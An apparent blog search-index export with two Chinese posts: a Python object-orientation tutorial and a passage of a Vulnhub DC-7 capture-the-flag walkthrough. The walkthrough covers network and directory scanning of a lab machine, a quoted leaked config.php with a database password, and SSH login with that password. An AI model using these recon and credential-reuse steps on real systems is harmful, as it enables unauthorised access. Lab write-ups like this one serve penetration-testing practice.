<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Python高级_面向对象</title>
      <link href="/2023/04/18/Python%E9%AB%98%E7%BA%A7-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2023/04/18/Python%E9%AB%98%E7%BA%A7-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="Python面向对象"><a href="#Python面向对象" class="headerlink" title="Python面向对象"></a>Python面向对象</h2><hr><hr><h3 id="创建类"><a href="#创建类" class="headerlink" title="创建类"></a>创建类</h3><p>使用class语句来创建一个新的类，class之后为类的名字并且以冒号结束</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ClassName</span><span class="token punctuation">:</span>    <span class="token string">'类的帮助信息'</span> <span class="token comment"># 类文档帮助字符串</span>    class_suite <span class="token comment"># 类体</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以下是一个简单的实例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""所有的员工的基类"""</span>    <span class="token comment"># 构造器</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"构造函数被调用！"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>age <span class="token operator">=</span> age        <span class="token keyword">pass</span>    <span class="token comment"># 属性</span>    name <span class="token operator">=</span> <span class="token string">""</span>    age <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># 方法</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我叫%s,我今年%d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"析构函数被调用！"</span><span class="token punctuation">)</span>        <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    xiaoming <span class="token operator">=</span> Employee<span class="token punctuation">(</span><span class="token string">"小米"</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span>    xiaoming<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在该实例中出现了两个特殊函数：</p><ul><li><code>def __init__():</code> 构造器，用于初始化对象</li><li><code>def __del__():</code> 析构器，在销毁对象之前调用</li></ul><p>self参数：</p><ul><li>在python的面向对象方法中，第一个参数永远是self，指向该对象自己本身，类似与C++中的this指针</li><li>self代表类的实例，而非类本身</li><li>如果要让self指向类本身，则需要写：<code>self.__class__</code></li><li>self不是关键字，可以随便换成其他的字，照样执行</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>this<span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"构造函数被调用！"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>this<span class="token punctuation">.</span>__class__<span class="token punctuation">)</span>        this<span class="token punctuation">.</span>name <span class="token operator">=</span> name        this<span class="token punctuation">.</span>age <span class="token operator">=</span> age        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="类的实例化"><a href="#类的实例化" class="headerlink" title="类的实例化"></a>类的实例化</h3><p>Python的实例化中没有new关键字，而是类似于函数的调用<br>以下实例化方法中使用Employee来实例化，并且通过__init__方法来接收参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''创建Employee的第一个对象'''</span>emp1 <span class="token operator">=</span> Employee<span class="token punctuation">(</span><span class="token string">"Zaya"</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span>emp2 <span class="token operator">=</span> Employee<span class="token punctuation">(</span><span class="token string">"Mari"</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h3><p>可以使用’.’来访问对象的属性</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">emp1<span class="token punctuation">.</span>diplay<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果为public则可以直接修改，如果为private则需要定义一个接口</p><hr><h3 id="Python内置类属性"><a href="#Python内置类属性" class="headerlink" title="Python内置类属性"></a>Python内置类属性</h3><ul><li><code>__dict__</code> 类的属性（包含一个字典，由类的数据属性组成）</li><li><code>__doc__</code> 类的文档字符串</li><li><code>__name__</code> 类名</li><li><code>__module__</code> 类定义所在的模块</li><li><code>__bases__</code> 类的所有父类构成的元素</li></ul><hr><h3 id="Python的对象销毁（垃圾回收）"><a href="#Python的对象销毁（垃圾回收）" class="headerlink" title="Python的对象销毁（垃圾回收）"></a>Python的对象销毁（垃圾回收）</h3><p>Python 使用了引用计数这一简单技术来跟踪和回收垃圾。</p><p>在 Python 内部记录着所有使用中的对象各有多少引用。</p><p>一个内部跟踪变量，称为一个引用计数器。</p><p>当对象被创建时， 就创建了一个引用计数， 当这个对象不再需要时， 也就是说， 这个对象的引用计数变为0 时， 它被垃圾回收。但是回收不是”立即”的， 由解释器在适当的时机，将垃圾对象占用的内存空间回收。</p><p>垃圾回收机制不仅针对引用计数为0的对象，同样也可以处理循环引用的情况。循环引用指的是，两个对象相互引用，但是没有其他变量引用他们。这种情况下，仅使用引用计数是不够的。Python 的垃圾收集器实际上是一个引用计数器和一个循环垃圾收集器。作为引用计数的补充， 垃圾收集器也会留心被分配的总量很大（即未通过引用计数销毁的那些）的对象。 在这种情况下， 解释器会暂停下来， 试图清理所有未引用的循环。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> y<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> x        self<span class="token punctuation">.</span>y <span class="token operator">=</span> y    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        class_name <span class="token operator">=</span> self<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__name__        <span class="token keyword">print</span><span class="token punctuation">(</span>class_name<span class="token punctuation">,</span> <span class="token string">"销毁"</span><span class="token punctuation">)</span>pt1 <span class="token operator">=</span> Point<span class="token punctuation">(</span><span class="token punctuation">)</span>pt2 <span class="token operator">=</span> pt1pt3 <span class="token operator">=</span> pt1<span class="token keyword">print</span><span class="token builtin">id</span><span class="token punctuation">(</span>pt1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">(</span>pt2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token punctuation">(</span>pt3<span class="token punctuation">)</span>  <span class="token comment"># 打印对象的id</span><span class="token keyword">del</span> pt1<span class="token keyword">del</span> pt2<span class="token keyword">del</span> pt3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>2256516188960 2256516188960 2256516188960<br>Point 销毁</p></blockquote><h3 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h3><p>继承语法如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> 派生类名字<span class="token punctuation">(</span>基类名字<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>在Python中继承的一些特点</strong></p><ol><li>如果在子类中需要父类的构造方法就需要显式的调用父类的构造方法，或者不重写父类的构造方法。<br>2）在调用基类的方法时，需要加上基类的类名前缀，且需要带上 self 参数变量。区别在于类中调用普通函数时并不需要带上 self 参数。<br>3）Python 总是首先查找对应类型的方法，如果它不能在派生类中找到对应的方法，它才开始到基类中逐个查找。（先在本类中查找调用的方法，找不到才去基类中找。</li></ol><p>比如下面这个例子</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了父类的构造器"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了父类的析构器"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Parent<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了子类的构造器"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了子类的析构器"</span><span class="token punctuation">)</span>c <span class="token operator">=</span> Child<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>调用了子类的构造器<br>调用了子类的析构器</p></blockquote><p>上述例子中，重写了父类的构造器，因此Python不会进入父类进行构造，也就不会触发父类的构造器。这种机制似乎对于析构器也会生效。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了父类的构造器"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了父类的析构器"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Parent<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span>    <span class="token comment"># def __init__(self):</span>       <span class="token comment"># print("调用了子类的构造器")</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"调用了子类的析构器"</span><span class="token punctuation">)</span>c <span class="token operator">=</span> Child<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>调用了父类的构造器<br>调用了子类的析构器</p></blockquote><p><strong>Python支持多继承</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SubClassName</span><span class="token punctuation">(</span>ParentName1<span class="token punctuation">,</span>ParentName2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="方法重写（重载）"><a href="#方法重写（重载）" class="headerlink" title="方法重写（重载）"></a>方法重写（重载）</h3><p>如果对父类的方法不满意，那么就可以执行重载操作，这时候Python会优先调用子类的方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Parent</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我是父"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Child</span><span class="token punctuation">(</span>Parent<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"我是子"</span><span class="token punctuation">)</span>child <span class="token operator">=</span> Child<span class="token punctuation">(</span><span class="token punctuation">)</span>child<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="基础重载方法"><a href="#基础重载方法" class="headerlink" title="基础重载方法"></a>基础重载方法</h3><p>下标列出了一些基础的重载方法</p><table><thead><tr><th>序号</th><th>方法、描述&amp;简单的应用</th></tr></thead><tbody><tr><td>1</td><td><code>__init__(args)</code>  构造函数:  obj=className(args)</td></tr><tr><td>2</td><td><code>__del__(self)</code> 析构函数: del obj</td></tr><tr><td>3</td><td><code>__repr__(self)</code>  转化为供解释器读取的形式: repr(obj)</td></tr><tr><td>4</td><td><code>__str__(self)</code>  转化为适用于人阅读的形式: str(obj)</td></tr><tr><td>5</td><td><code>__cmp__(self,x)</code>  对象间的比较: cmp(obj,x)</td></tr></tbody></table><hr><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>Python同样支持运算符重载，实现方法如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">class</span> <span class="token class-name">Vector</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>a <span class="token operator">=</span> a        self<span class="token punctuation">.</span>b <span class="token operator">=</span> b    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Vector (%d, %d)'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__add__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Vector<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">+</span> other<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b <span class="token operator">+</span> other<span class="token punctuation">.</span>b<span class="token punctuation">)</span>v1 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>v2 <span class="token operator">=</span> Vector<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>Vector(7,8)</p></blockquote><hr><h3 id="类的属性和方法"><a href="#类的属性和方法" class="headerlink" title="类的属性和方法"></a>类的属性和方法</h3><p>这个即访问控制符</p><h4 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h4><ul><li>使用双下滑线进行声明，指示这个属性为私有，不能在类的外部被使用或者直接访问，只能在类的内部进行访问。</li><li><code>__private_attrs</code><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">People</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>__age <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># 通过这个双下划线，指明了这个__age属性是私有的。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="类的方法"><a href="#类的方法" class="headerlink" title="类的方法"></a>类的方法</h4><ul><li>在类的内部，使用def关键字可以为类定义一个方法，和一般的函数定义不同，类方法必须包含参数self，且为第一个参数永远都是self。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">People</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"Xiaoming"</span>        <span class="token comment"># 定义一个show()方法</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"My name's "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="类的私有方法"><a href="#类的私有方法" class="headerlink" title="类的私有方法"></a>类的私有方法</h4><ul><li>两个下划线开头，声明该方法为私有方法，不能在类的外部进行调用，在类的内部进行调用</li><li><code>__private_method</code></li></ul><hr><h4 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h4><p>Python的访问控制非常有意思</p><ol><li>无下划线开头<code>foo</code> 一般为public属性</li><li>单下划线开头<code>_foo</code> 一般为protected属性</li><li>双下划线开头<code>__foo</code>一般为private属性</li><li>双头双尾<code>__foo__</code> 一般为系统定义的名字，如<code>__init__</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Python 高级教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python Master Tutorial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub_DC系列靶场-DC7攻略</title>
      <link href="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/"/>
      <url>/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-7靶场练习记录"><a href="#DC-7靶场练习记录" class="headerlink" title="DC-7靶场练习记录"></a>DC-7靶场练习记录</h1><p>PS1:欢迎来到我的博客：<a href="https://littlewith.github.io/">https://littlewith.github.io/</a><br>PS2:欢迎来到我的主页：<a href="https://littlewith.top/">https://littlewith.top/</a><br>博客文章会同步更新。<br><em><strong>注：本文章仅作交流学习使用，请勿用于非法用途，否则后果自负！！！</strong></em></p><hr><hr><h2 id="0x00环境准备"><a href="#0x00环境准备" class="headerlink" title="0x00环境准备"></a>0x00环境准备</h2><ol><li><p>DC-7靶场信息：</p><blockquote><p>Description<br>DC-7 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br>While this isn’t an overly technical challenge, it isn’t exactly easy.<br>While it’s kind of a logical progression from an earlier DC release (I won’t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won’t succeed.<br>What you will need to do, is to think “outside” of the box.<br>Waaaaaay “outside” of the box. :-)<br>The ultimate goal of this challenge is to get root and to read the one and only flag.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p></blockquote></li><li><p>攻击机：Kali Linux 2022.1</p></li><li><p>靶机：DC 7<br>为了模拟真实公网环境，需要确保靶机和攻击机均使用NAT模式，并且和主机安装在同一个网段下，模拟环境采用vmware虚拟机进行搭建，而且两者能进行相互通信。</p></li></ol><hr><h2 id="0x01信息搜集"><a href="#0x01信息搜集" class="headerlink" title="0x01信息搜集"></a>0x01信息搜集</h2><p>目前已知的黑客主机的ip为192.168.23.131，此时我们并不知道靶机的具体网址，我们可以使用fscan工具来对靶机进行扫描。</p><p>我们先去Github上面下载fscan工具，然后重命名为fscan，接着使用-h [网段] 的方式进行自动扫描。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan -h <span class="token number">192.168</span>.23.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/56ce87a700ae40d8b58a0b53fd8da8ef.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/56ce87a700ae40d8b58a0b53fd8da8ef.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>此时排除本机ip，结合title:”Welcome to DC-7”即可发现靶机的地址192.168.23.129，同时我们还可以发现主机开放了80端口和22端口，意味着运行了web服务，我们接下来访问靶机的ip，发现了web主页：</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/1331331612ec4dec9845000a7c961c0c.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/1331331612ec4dec9845000a7c961c0c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>根据主页的提示，它提示我们”out side the box !”，并告诉我们不能强力爆破出密码。通过插件”Wapplyazer”,我们可以得到的信息是：这个网站的操作系统是<strong>Debian</strong>，使用的是<strong>Apache</strong>服务器，并且采用了<strong>php</strong>语言编写的后端，最重要的是识别到了使用的CMS为<strong>Drupal 8</strong>，同时我们还发现了该网站作者名字叫@DC7USER</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e7c9e723a7f34524bf2acc37e58c8647.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e7c9e723a7f34524bf2acc37e58c8647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>那么按照惯例，接下来就该扫描网站的目录了，我们使用dirsearch工具进行目录扫描，使用的命令为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://192.168.23.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>显然扫描出了很多的结果，经过分析后，提取出了一些有用的结果：</p><p>首先是包含的信息文件：</p><ul><li>robots.txt==&gt;包含了一些网站的路由</li><li>web.config==&gt;包含了一些网站登录信息</li><li>README.txt==&gt;网站CMD建立时候的自述文件</li><li>INSTALL.txt==&gt;网站CMS安装指南</li><li>各种数据文件.sql(1.sql、2.sql等)</li></ul><p>在robots.txt、dirsearch中间还扫描出了一些可能有作用的路由：</p><ul><li>/user/login</li><li>/user/register</li><li>/comment/reply</li><li>/search</li><li>/core</li></ul><p>通过web.config目录，我们发现了网站对于这些请求的rewrite过滤规则。<br>该规则显示，本网站过滤了一堆相关的字符串，统一返回403forbidden，经过验证发现，上方出现的路由几乎都被拦截了。</p><p>总的来说，到此为止收集到的信息有以下几点：</p><ol><li>所有的.sql文件均无法进行读取，统一返回了403错误码</li><li>存在登录页面/user/login，但是我们无法获得用户名和密码，并且注册需要管理员权限，直接访问会显示无法注册</li><li>重置密码使用的是邮箱验证码，也无法进行SQL注入修改密码等</li><li>在web.config、robots.txt、README.txt和INSTALL.txt文件中我们可以更加确定使用的CMS是Drupal 8</li><li>网站作者名字叫@DC7USER</li></ol><p>我们从网络上搜索这个作者，发现了他的Github主页：</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e06aa5b994234f688d9fbd99dcc49fc2.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e06aa5b994234f688d9fbd99dcc49fc2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>这里有个项目，经过查找发现了网站的配置信息找到config.php，似乎还发现了密码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dc7user"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"MdR3xOgB7#dW"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Staff"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>联系到之前的开放端口22，想到ssh登录，下面将尝试登录主机。</p><hr><h2 id="0x02开始渗透"><a href="#0x02开始渗透" class="headerlink" title="0x02开始渗透"></a>0x02开始渗透</h2><p>尝试ssh进行登录，OK，成功拿到了shell。</p><img src="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e3c2fc438d164d1d8a680bb6e924efc9.png" class="lazyload placeholder" data-srcset="/2023/04/17/Vulnhub-DC%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA-DC7%E6%94%BB%E7%95%A5/e3c2fc438d164d1d8a680bb6e924efc9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" class=" lazyload placeholder" title="pic"><p>常规思路，接下来尝试sudo提权，发现该用户关闭了sudo权限，提示无法找到sudo，尝试find提权依然失败。</p><p><del>那么接下来尝试使用matasploit对靶机进行提权。</del><br><del>(事实证明msf框架提权失败)</del></p><p>继续尝试，在home目录发现了一个backups目录，里面含有gpg加密的文件，应该是个备份文件，旁边还存着加密的日志mbox。我们查看一下日志文件，发现加密的脚本文件是存在一个指定的目录/opt/scripts/backups.sh下的：</p><img 